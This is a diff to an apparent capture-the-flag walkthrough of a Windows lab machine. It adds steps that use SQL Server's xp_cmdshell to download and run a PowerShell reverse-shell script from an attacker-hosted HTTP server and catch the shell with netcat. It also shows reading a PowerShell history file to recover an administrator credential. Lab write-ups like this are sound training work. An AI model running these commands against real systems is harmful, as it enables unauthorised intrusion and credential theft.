@@ -144,28 +144,80 @@ archetype\sql_svc
 
 SQL>
 ```
-For a more convenient and stable connection, we will set up a reverse shell on target machine. There are many shell script that available on the Internet, find yourself one and save it as `shell.ps1`. I took it from this site: [Shells - Windows](https://book.hacktricks.xyz/shells/shells/windows).
+For a more convenient and stable connection, we will set up a reverse shell on target machine. There are many shell script that available on the Internet, find yourself one and save it as `shell.ps1`. Just for reminding, each codebase or OS requires different reverse shell. Since we want a Windows PowerShell, I took script from this site: [Shells - Windows](https://book.hacktricks.xyz/shells/shells/windows).
 
-If you've never heard of 'reverse shell', this would be helpful: [Understanding Reverse Shells](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/).
+If you've never heard of "reverse shell", this would be helpful: [Understanding Reverse Shells](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/).
 > What is .ps1 extention?
 > 
 > - [PS1 File Extension](https://fileinfo.com/extension/ps1)
 > 
 > - [Differences between commands run in .bat file and powershell.exe](https://stackoverflow.com/questions/48215483/differences-between-commands-run-in-bat-file-and-powershell-exe)
 
-Open http server for SQL Server to get the script
+Now, open an http server at localhost for SQL Server to get the script.
 ```bash
 $ python3 -m http.server 8080
 ```
-
-Open listening port for catching reverse shell
+Also, open a listening port for catching reverse shell.
 ```bash
 $ nc -lnvp <port>
 ```
-
-Execute reverse shell from SQL Server
+Last step, get script from localhost http and execute reverse shell from SQL Server.
 ```bash
-SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:8080/path_to_shell.ps1')""
+SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:8080/path_to_shell.ps1')"
+```
+At listening terminal, now we have reverse shell!
+```bash
+# whoami
+archetype\sql_svc
+# pwd
+Path               
+----               
+C:\Windows\system32
+
+# cd C:\Users
+# dir
+	Directory: C:\Users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        1/19/2020  10:39 PM                Administrator
+d-r---        1/19/2020  10:39 PM                Public
+d-----        1/20/2020   5:01 AM                sql_svc
+
+# cd sql_svc\Desktop
+# dir
+	Directory: C:\Users\sql_svc\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/25/2020   6:37 AM             32 user.txt
+
+# type user.txt
+<hidden flag>
+
+# 
 ```
 
 ### 3. Privilege Escalation
+Just by a simple search, I found this incredible useful checklist [Windows Local Privilege Escalation - HackTricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#environment).
+
+Follow step by step on the checklist, I checked for environment variables but there was nothing interesting.
+
+Next, thanks to Google again :v, I found this: [PowerShell History File](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html). According to the artical, PowerShell history file located at `C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine` by default. If it's not there, we could find it with command `Get-PSReadlineOption`.
+```bash
+# cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+# dir
+	Directory: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        3/17/2020   2:36 AM             79 ConsoleHost_history.txt
+
+# type ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator <password>
+exit
+
+# 
+```
+*Have fun hacking!*
+
+Henry.
